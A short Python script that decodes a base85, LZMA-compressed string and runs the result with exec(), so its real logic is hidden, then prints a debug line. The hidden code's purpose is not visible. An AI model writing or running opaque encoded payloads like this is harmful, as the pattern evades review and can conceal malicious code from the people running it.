import lzma
import base64

PAYLOAD = """{Wp48S^xk9=GL@E0stWa761SMbT8$j-~groe_a4Hn@VT6Qap3zWZcaQ#QWy)nykJrT8u(61MEwu2t>pZPw3lKwZdJ>;qb+gF(SBW-mSPkg_+XvD0JV>*BOYjiZ#9QU(q=dI)?Jaua!~(0(unMHnJ70WQZTx)I<jW6#%5<A>y^<-Nj3qHK2GZN14+QT&aGD8$0nHzyJUMS$JWCb)KQ;00El;rvU%}W>D%_vBYQl0ssI200dcD"""

code_bytes = lzma.decompress(base64.b85decode(PAYLOAD))
exec(code_bytes.decode("utf-8"), {"__name__": "__main__"})


print("HERE IS -------2")